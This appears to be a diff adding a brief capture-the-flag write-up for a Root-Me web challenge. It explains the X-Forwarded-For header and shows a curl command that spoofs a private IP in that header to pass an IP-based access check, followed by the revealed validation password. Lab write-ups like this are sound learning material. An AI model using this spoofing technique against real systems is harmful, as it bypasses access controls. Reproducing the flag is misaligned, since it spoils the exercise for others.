@@ -1,0 +1,8 @@
+Used BurpSuite to intercept the connection
+Tried the X-Forwarded For
+The HTTP X-Forwarded-For (XFF) request header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through a proxy server.
+
+curl 'http://challenge01.root-me.org/web-serveur/ch68/' --header 'X-Forwarded-For: 192.168.127.132'
+
+Well done, the validation password is: <strong>Ip_$po0Fing
+</strong>
